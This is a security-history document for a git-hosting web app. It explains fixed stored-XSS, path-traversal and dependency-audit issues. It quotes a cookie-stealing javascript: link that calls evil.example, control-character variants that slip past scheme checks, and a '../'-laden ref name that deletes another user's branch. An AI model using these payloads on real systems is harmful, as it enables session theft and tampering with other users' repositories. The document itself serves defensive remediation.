# Security history

How the invariants in [security.md](./security.md) were arrived at. Each section
is the investigation that produced one of them, kept because the reasoning is
what tells you whether a rule still applies when you change the code around it.
The rules themselves — what must hold — live in [security.md](./security.md);
this is the why.

Nothing here is a current vulnerability. Where a section describes something
that was exploitable, it was fixed in the same change that added its rule, and
the rule is what keeps it fixed.

## Stored XSS in markdown rendering

`MarkdownRenderer` (`src/components/MarkdownRenderer.tsx`) renders content
that is **fully attacker-controlled**: issue bodies, PR bodies, comments, and
README files — anyone with write access to a repo can put arbitrary markdown in
front of anyone who views that content.

The link/image renderer used to render a raw `<a href={href}>`/`<img
src={src}>` for any href/src that didn't match a known "external" pattern and
wasn't a recognized internal repo-reference link — reachable specifically when
no `branch` context was available, which is exactly the case for issue/PR/
comment bodies (they're rendered without a `branch` prop, only with `owner`/
`name`). A comment containing `[click me](javascript:fetch('https://evil.example/steal?c='+document.cookie))`
would render as a live `javascript:` link, executing in the viewer's
authenticated session on click.

**Fix**: `isSafeHref`/`isSafeImageSrc` gate every href/src before it reaches a
real DOM attribute. The rule is an **allowlist**, not a blocklist: a value with
no scheme at all is a relative reference (safe by construction), and an explicit
scheme is allowed only if it is `http:`, `https:` or `mailto:` — with `data:`
allowed additionally for images, and only for `data:image/…`, since an `<img
src="data:…">` cannot execute script the way an `<a href="data:text/html,…">`
navigation can. Anything else — `javascript:`, `vbscript:`, `data:text/html`,
whatever comes next — is rejected by construction rather than by keeping a
blocklist up to date.

**The subtle half of that rule is what "has no scheme" means.** These
predicates do not judge the value's literal prefix; they have to judge what the
browser's URL parser will do with it. That parser removes every ASCII tab and
newline from its input and strips leading C0 controls and spaces *before* it
reads the scheme, so both `<java\tscript:alert(1)>` and
`<\u0001javascript:alert(1)>` are live `javascript:` URLs even though neither
starts with `javascript:`. A prefix-anchored scheme test returns "no scheme, so
it's just a relative link" for both, and the original implementation did
exactly that. So any value containing a C0 control or a space is now rejected
outright, and only then is the scheme allowlisted. Nothing legitimate is lost: a
markdown destination cannot carry a raw control character or space — the
markdown parser percent-encodes them before the renderer sees the value.

That percent-encoding is worth knowing about, because it is *not* part of this
app's control and has silently neutralised these payloads all along: by the time
`isSafeHref` runs, `java\tscript:…` has already become `java%09script:…`, and
`%` is not a scheme character, so the browser resolves it as a relative path.
`MarkdownRenderer.render.test.tsx` therefore asserts the *outcome* through the
browser's own URL parser (`new URL(value, origin).protocol` is never
`javascript:`) rather than trusting that encoding to keep happening. If a
react-markdown upgrade, a `rehype-raw` addition, or a new caller ever stops
pre-encoding a user-controlled href, the test says so.

**If you touch this component**: any new place that renders a user-controlled
href/src as a real attribute must go through these same two functions, and any
new *source* of an href (JSON, a prop, an API field) must be judged knowing that
it has not been through a markdown parser.

## Path traversal via repository name

`repositories.ts`'s `createRepository`/`updateRepository` used to validate the
repo `name` field with only `z.string().min(1).max(100)` — no character
restriction at all. That name becomes a segment of the repository's gitdir
(`repos/{ownerKey}/{repoName}/git`), and every path isomorphic-git hands
`gitFs` is normalized (`..` resolved) before it's mapped onto an R2 key — a
repository named `..` would put its gitdir at `repos/git`, outside its owner's
prefix; a name like `../victim/repo` would land inside another user's
repository.

**Fix, at two layers** (defense in depth — don't remove either on the
assumption the other covers it):

1. **Input validation** — repository names (`repositories.ts`'s
   `repoNameSchema`) and usernames (`auth.ts`'s `usernameValidator`) must
   match `STORAGE_NAME_RE`, `/^[A-Za-z0-9](?:[A-Za-z0-9._-]*[A-Za-z0-9])?$/`:
   alphanumeric at both ends, no `/` or `\`, so never `.` or `..`.
2. **Key construction fails closed** — `git-storage-naming.ts` checks every
   segment against the same pattern when building a key and throws instead
   of sanitizing, so a caller that skipped validation can't reintroduce the
   bug by omission. Usernames can't change, so a key never goes stale.

S3 itself has no path resolution (`"repos/x/../y"` is a literal key), but
`gitFs` does, and every git operation goes through it — so treat these
segments as paths, not opaque strings.

## Path traversal via git branch/ref names

A separate, more severe traversal bug than the repository-name one above:
**branch/ref names** — a git push's ref-update command, a branch name typed
into the web UI, a pull request's source/target branch — reached several
isomorphic-git primitives that, unlike `git.branch`/the top-level
`git.writeRef`, **never validate the ref name themselves**:
`git.commit`, `git.merge`, `git.deleteBranch`, and the top-level
`git.resolveRef`/`git.deleteRef` all resolve straight through
`fs.write`/`fs.rm(join(gitdir, ref))` (or the R2-backend equivalent) with no
jail to the current repo's own directory.

That alone would be contained if the storage layer re-verified containment
per repository — but it doesn't.
The object-store `fs` (`git-fs.ts`, built on `git-fs-s3`'s `createGitFs`) has
no notion of "which repo this request belongs to" — it's constructed with no
key prefix (gitdirs are the full storage roots), and maps whatever path
isomorphic-git hands it straight onto an R2 key, normalized only to resolve
`.`/`..` segments and reject one that would escape the *store's own* root
(`git-fs-s3`'s `normalizePath`) — not any specific repository's gitdir. Once a
`../`-laden ref name collapses to a path like
`repos/{victim-owner}/{victim-repo}/git/refs/heads/main`, the store
reads/writes/deletes exactly that key — the *victim's* real ref file — even
though the operation started against the attacker's own repo's `gitdir`. This
was directly exploitable in production.

Two concrete ways this was reachable, both through the ordinary web UI (no
git CLI, no raw HTTP crafting needed for the second one):

1. **`git push`'s receive-pack ref-update commands** — the client-supplied
   `refName` in each `<oldOid> <newOid> <refName>` command line was passed
   straight to `git.resolveRef`/`git.deleteRef`/`git.writeRef` in
   the receive-pack handler. `git.writeRef` happens to validate internally, but
   `git.deleteRef` and `git.resolveRef` don't — a ref-delete command with
   `refName: "../../victim-owner/victim-repo/git/refs/heads/main"` and
   `oldOid` set to the all-zero oid trivially passes the compare-and-swap
   check (`resolveRef` on a non-well-formed-ref path fails and is treated as
   "doesn't exist yet"), then deletes that file.
2. **Web-UI branch operations** — `files.ts`'s `uploadFile`/`deleteFile`/
   `createBranch`/`deleteBranch` and `pull-requests.ts`'s `createPullRequest`
   all accepted `branchName`/`sourceBranchName`/`targetBranchName` as a bare
   `z.string()` with no format restriction. "Delete branch" with a
   traversal name reaches `git.deleteBranch` (no CAS check needed at all,
   simpler to exploit than the push path above); a PR with a traversal
   `targetBranchName`, once merged by anyone with merge rights, reaches
   `git.merge`/`git.commit`.

**Fix**: `src/server/git-ref-name.ts` — `isSafeFullRefName` (for the
`refs/heads/…`/`refs/tags/…` shape a push's `refName` takes) and
`isSafeBranchName` (for the bare-name shape every other entry point takes,
also rejecting anything that already looks like a full ref path, which would
otherwise smuggle through unprefixed) — both built on the same character-class
rules isomorphic-git's own internal `isValidRef` uses. Applied at every layer,
matching the repository-name fix's defense-in-depth shape:

1. **Input validation** — `files.ts` and `pull-requests.ts` validate every
   branch-name-shaped field with `safeBranchNameSchema` instead of a bare
   `z.string()`.
2. **Point of use** — `git-write.ts` re-validates every branch name
   immediately before calling into isomorphic-git, so a future call site
   that skips the zod schema can't reintroduce the bug by omission.
3. **Receive-pack** — `git-fs-s3/http`'s `applyRefUpdates` validates every
   ref-update command's `refName` with `isSafeFullRefName` before
   `resolveRef`/`deleteRef`/`writeRef` run, rejecting the command with
   `ok: false, reason: "invalid ref name"`.

## Path traversal via the raw-content route's ref/path

`/api/raw/{owner}/{repo}/{ref}/{...path}` (`src/server/raw.ts`, the "Raw"
link and binary previews) reads its `ref` and `path` straight off the URL's
decoded segments and passed them directly into `getFileContent` — unlike every other entry point in the
app that accepts a branch-name- or path-shaped field, this route did **not**
run them through `safeBranchNameSchema`/`safeRepoPathSchema` first, since it's
a raw API route handler rather than one of `files.ts`'s validated
`createServerFn`s.

That resolves `ref` with the top-level `git.resolveRef` — one of the isomorphic-git primitives that (like
`git.deleteRef`/`git.commit`/`git.merge` — see the ref-name section above)
does not validate ref format internally. The read goes through `gitFs`, which
resolves `../` components before mapping the path onto an R2 key (see the
ref-name section above) — so a crafted `ref` could read another repository's
ref/blob data, bypassing that repository's own read-access check
entirely (the access check only ever validated access to the repo named in
the URL's `{owner}/{repo}`, not whatever repo the traversal actually reads
from).

**Fix**: both `ref` and `path` are validated (`isSafeRefName` /
`isSafeRepoPath`, `git-ref-name.ts`) before either reaches `getFileContent`,
returning a 404 for anything invalid — same posture as every other
branch/path field in the app. If you add a new route handler that reads
request-supplied path segments directly (rather than through one of
`files.ts`'s already-validated server functions), run them through these same
validators rather than assuming access-control alone is enough.

## Fixed: SHA-pinned blob viewing was rejected by the branch-name validator

`isSafeBranchName` deliberately rejects any 40-hex-char value (to keep a
*stored* branch name from ever being ambiguous with a commit SHA at write
time — see its comment in `git-ref-name.ts`) — but `files.ts`'s read-path
handlers (`getFile`, `listFiles`, `getLastCommits`, `getFileHistory`,
`getCommits`) reused the same `safeBranchNameSchema` for their `branchName`
field, which is also the field the blob page's **Permalink** button relies on
being able to pass a full commit SHA (`/repo/{owner}/{name}/blob/{sha}/{path}`
— see `isPinnedRevision` in that route). The result: viewing a file pinned to
a specific commit threw a validation error before ever reaching the handler,
which the blob page's `error || !file` check silently rendered as "File Not
Found" — indistinguishable from the file genuinely not existing.

**Fix**: `git-ref-name.ts` now also exports `isSafeRefName`/
`safeRefNameSchema`, which accept *either* a valid branch name *or* a full
40-hex commit SHA, still rejecting every unsafe shape either check would
reject on its own. The read-path `branchName` fields above now use this;
write-path fields (`uploadFile`, `deleteFile`, `createBranch`, `deleteBranch`,
`getBranchDiff`, `createPullRequest`'s branch fields) keep the stricter
`safeBranchNameSchema`, since a SHA is never a meaningful value there.
`getCommit`/`getCommitDiff`'s `commitSha` field now uses a dedicated
`safeCommitShaSchema` (exact 40-hex) instead of a bare `z.string()`, for the
same defense-in-depth reason every other ref-shaped field is validated rather
than trusted.

## Dependency vulnerabilities

`pnpm audit --prod` is clean (0 findings) as of the last pass. It wasn't always —
worth knowing both what was actually wrong and how it was fixed, since the
same shape of problem can recur:

- `@cloudflare/vite-plugin` was a fully dead dependency (never wired into
  `vite.config.ts` — see [deployment.md](./deployment.md)) that dragged in
  `wrangler`/`miniflare`'s own bundled `esbuild`/`undici`/`ws`/`sharp`
  versions as real, vulnerable installs. Removed outright.
- The remaining findings (`hono`, `@hono/node-server`, `lodash`,
  `deepmerge-ts`, `effect`, `valibot`, `undici`) all traced through
  `better-auth`'s optional multi-ORM peer graph pulling in `prisma`'s bundled
  dev-studio tooling — never imported by this app's code, just present as
  peer-dependency noise. Pinned via `pnpm.overrides` in `package.json`.
- `@tanstack/react-start` <1.168.60 has an XSS CVE (CVE-2026-102989) that
  Vercel's build refuses to deploy — bumped. `seroval`, `source-map-js`,
  `proxy-addr`, `ip-address`, `fast-uri`, `brace-expansion`,
  `@modelcontextprotocol/sdk` and `shell-quote` are pinned via overrides.
  `shadcn` moved to `devDependencies` (it's only a build-time CSS `@import`
  plus the component CLI); its `braces` finding has no patched release.
- `pnpm audit --prod` is clean. Full `pnpm audit` still reports `braces`
  (GHSA-vfj7-8cjw-p6xm, via `shadcn`; no fix exists) and
  `postcss-selector-parser` (GHSA-rj75-hqrm-r3gf, via
  `@tailwindcss/typography`; the fix is a major bump it doesn't support) —
  both dev/build-time only. Those two advisory IDs are listed in
  `package.json`'s `pnpm.auditConfig.ignoreGhsas` so CI's full `pnpm audit`
  still fails on anything new; remove an entry once its fix is installable.

**The overrides need an explicit upper bound, not just a patched floor.**
`pnpm audit --fix`'s auto-generated overrides default to an open-ended target
(`">=7.29.0"`, no ceiling) — that resolved cleanly at the time, but the *next*
`pnpm install` after a new major version of that package gets published will
happily jump to it. This actually broke the whole test suite once: an
open-ended `undici` override resolved to `undici@8.10.0` on a later install,
and `jsdom` (which needs `undici@^7.x` — it requires an internal path,
`undici/lib/handler/wrap-handler.js`, that doesn't exist in v8) crashed
outright. Every override in `package.json` is capped below its next major
(`">=7.29.0 <8.0.0"`) for exactly this reason — if you add a new one, cap it
the same way, and re-run the full test suite (not just `pnpm audit`) before
considering the fix done.

**Don't move the overrides out of `package.json` on pnpm 9.15's say-so —
verify first.** `pnpm install` on this pnpm version prints `The "pnpm" field
in package.json is no longer read by pnpm... See pnpm.io/settings for the
new home`, pointing at `pnpm-workspace.yaml`'s `overrides` key. That warning
is wrong for this pnpm version: empirically, `pnpm-workspace.yaml`'s
`overrides` key has **zero effect** here (tested directly — overriding a
plain top-level dependency there did nothing), while `package.json`'s
`"pnpm"` key still works exactly as before, warning aside. Moving the block
anyway silently drops every cap: a full lockfile regeneration afterward
converged on real, older, vulnerable versions of several of these packages
through peer-dependency-driven duplicate resolution paths (wrangler's own
bundled `miniflare`, prisma's peer chain) that weren't resolved before —
`pnpm audit` went from 0 findings to 69 (14 high). If a future pnpm/Node
upgrade repeats this warning, confirm which location actually works before
touching anything: override some inert top-level dependency (not one of the
real caps) to an arbitrary old version and check `pnpm ls <that package>`
reflects it — don't trust the warning text or `pnpm why` alone, since `pnpm
why` only traces one representative path per package and can look correct
while a different peer-resolved instance of the same package silently isn't
overridden at all.

If `pnpm audit` shows a new finding, check `findings[].paths` in `pnpm audit
--json` to see whether the dependency chain is genuinely dev-only/unreachable
from the deployed runtime before dismissing it the way the old findings were
— don't assume every future finding is automatically noise just because past
ones were.

## A known, separate issue (not a vulnerability, but worth knowing)

Blob routes for files ending in `.md` (e.g. viewing a `README.md` through the
blob viewer) currently 404 before ever reaching the app's own router, with a
raw connect-style `Cannot GET ...` body — confirmed via `pnpm dev` that this
is specific to `.md` (a sibling request for the same nonexistent repo/path
with a `.txt` extension, or no extension at all, both reach the app and hit
the expected DB/repo-not-found error instead). Root cause is nitro's local
Vercel-dev-emulation static-asset short-circuit misfiring for `.md`
specifically — not yet traced to the exact line, since it isn't reproducible
by grepping nitro's dist for any `.md`-specific handling.

**This is very likely dev-only, not a production bug**: the actual generated
`.vercel/output/config.json` routing (inspected directly after a real
`pnpm build`) has no rule that treats `.md` specially — it's just the
generic `publicAssets` cache-control rule plus `{ "handle": "filesystem" }`
falling through to `/__server` for anything without a real matching file in
`.vercel/output/static`. Since no build output ever contains a static file at
a path like `/repo/{owner}/{repo}/blob/{branch}/README.md`, real Vercel
routing's filesystem-handle step has nothing to match and should fall
through to the SSR function correctly. The previous note in this doc
speculating this "would also break in a real deployment" was not verified
against the actual routing config and should not be treated as confirmed —
if you're debugging a `.md`-related 404 in an actual deployed environment,
treat it as a new finding rather than assuming this is the cause.
